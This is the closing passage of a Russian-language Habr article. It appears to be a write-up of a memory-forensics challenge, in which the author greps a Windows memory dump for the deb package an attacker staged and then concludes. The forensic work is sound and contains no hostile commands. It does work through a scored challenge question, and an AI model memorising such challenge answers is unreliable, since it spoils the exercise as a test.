    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/7f6/985/e79/7f6985e792a84b1a62568f66ff808f39.png" width="940" height="151" data-src="https://habrastorage.org/getpro/habr/upload_files/7f6/985/e79/7f6985e792a84b1a62568f66ff808f39.png">
    <figcaption></figcaption>
   </figure>
   <p>Пароль мы нашли, а ещё мы узнали, что файл в конце удалили, поэтому искать его с использованием плагина filescan в дампе памяти смысла не было.</p>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/6ac/63a/703/6ac63a703fc13772f78b20ab1f499ef3.png" width="940" height="69" data-src="https://habrastorage.org/getpro/habr/upload_files/6ac/63a/703/6ac63a703fc13772f78b20ab1f499ef3.png">
    <figcaption></figcaption>
   </figure>
   <p>Чтобы ответить на последний вопрос <strong>№16 (What is the name of the deb package the attacker staged to infect the E Coin Servers?) </strong>я поискал пакеты с расширением *.deb в дампе:</p>
   <pre><code class="bash">strings -el ecorpwin7-e73257c4.vmem | egrep -A5 -B5 '.deb'</code></pre>
   <figure class="full-width ">
    <img src="https://habrastorage.org/r/w1560/getpro/habr/upload_files/7d8/c1e/337/7d8c1e3370bb3caaba13cb64ca9e1237.png" width="940" height="284" data-src="https://habrastorage.org/getpro/habr/upload_files/7d8/c1e/337/7d8c1e3370bb3caaba13cb64ca9e1237.png">
    <figcaption></figcaption>
   </figure>
   <h2>Заключение</h2>
   <p>Вот и всё, друзья. Статья получилась большая, хотел осветить некоторые важные на мой взгляд вопросы, поэтому, кто дочитал, тот молодец! =)</p>
   <p>Буду рад, если информация окажется для вас полезной. Другие статьи, WriteUp’ы и полезные утилиты можно найти <a href="http://ant0nyn0p.ru/" rel="noopener noreferrer nofollow">здесь</a>.</p>
   <p></p>
  </div>
 </div>
</div> <!----> <!---->